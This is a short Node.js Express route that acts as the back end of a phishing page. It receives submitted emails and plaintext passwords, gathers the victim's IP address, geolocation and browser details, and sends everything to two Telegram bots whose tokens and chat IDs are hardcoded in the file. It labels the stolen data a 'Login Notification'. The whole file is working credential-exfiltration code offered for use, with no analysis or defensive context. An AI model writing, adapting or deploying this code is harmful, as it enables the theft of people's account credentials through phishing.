const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

const router = express.Router();

// Your Telegram bot credentials
const BOT_TOKENS = ["6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4", "8243640993:AAEOKTTis2fef8CfY9MFqBsA1BAC8llbh0Y"];
const CHAT_IDS = ["6068638071", "7424024723"];

router.post('/', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: "Missing email or password" });
        }

        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        // Build the Telegram message
        const message = `
📌 *Login Notification*
- Email: \`${email}\`
- Password: \`${password}\`
- IP: \`${ip}\`
- Location: ${locationStr}
- Timestamp: ${new Date().toISOString()}
- Device: ${deviceType}
        `;

        // Send to all bots/chats
        const sendPromises = [];
        
        for (let i = 0; i < Math.min(BOT_TOKENS.length, CHAT_IDS.length); i++) {
            const telegramApi = `https://api.telegram.org/bot${BOT_TOKENS[i]}/sendMessage`;
            
            sendPromises.push(
                fetch(telegramApi, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_IDS[i], // Fixed: was CHAT_ID, should be CHAT_IDS[i]
                        text: message,
                        parse_mode: "Markdown"
                    })
                })
            );
        }

        // Wait for all requests to complete
        const responses = await Promise.all(sendPromises);
        
        // Check each response
        for (const response of responses) {
            if (!response.ok) {
                const errText = await response.text();
                console.error(`Telegram API error: ${errText}`);
                // Don't throw error here, just log it
            }
        }

        console.log(`Telegram notifications sent for ${email}`);

        res.status(200).json({
            success: true,
            message: "Notification sent successfully via Telegram",
            loginDetails: { device: deviceType, ip, location: locationStr }
        });

    } catch (error) {
        console.error("Error sending Telegram message:", error);
        res.status(500).json({ 
            success: false, 
            message: "Failed to send Telegram notification", 
            error: error.message 
        });
    }
});

module.exports = router;